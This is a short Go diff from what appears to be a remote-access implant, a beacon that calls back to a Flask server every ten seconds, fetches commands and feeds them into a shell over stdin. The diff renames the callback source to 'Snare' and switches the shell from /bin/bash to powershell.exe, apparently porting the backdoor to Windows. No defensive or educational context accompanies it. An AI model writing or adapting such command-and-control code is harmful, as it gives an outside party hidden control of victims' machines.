@@ -18,7 +18,7 @@ import (
 )
 
 var serv = getServer() //IP of flask serv
-var src = "GoBin"      // where is this calling back from
+var src = "Snare"      // where is this calling back from
 var loopTime = 10      //sleep time in secs
 
 func getServer() string {
@@ -48,9 +48,9 @@ func getCommands() {
 	if err != nil {
 		return
 	}
-	fmt.Printf("commands: \n%s\n", txt)
+	fmt.Printf(string(txt))
 	//exec.Command(string(txt))
-	bsh := exec.Command("/bin/bash")
+	bsh := exec.Command("powershell.exe")
 	stdin, _ := bsh.StdinPipe()
 	go func() {
 		defer stdin.Close()
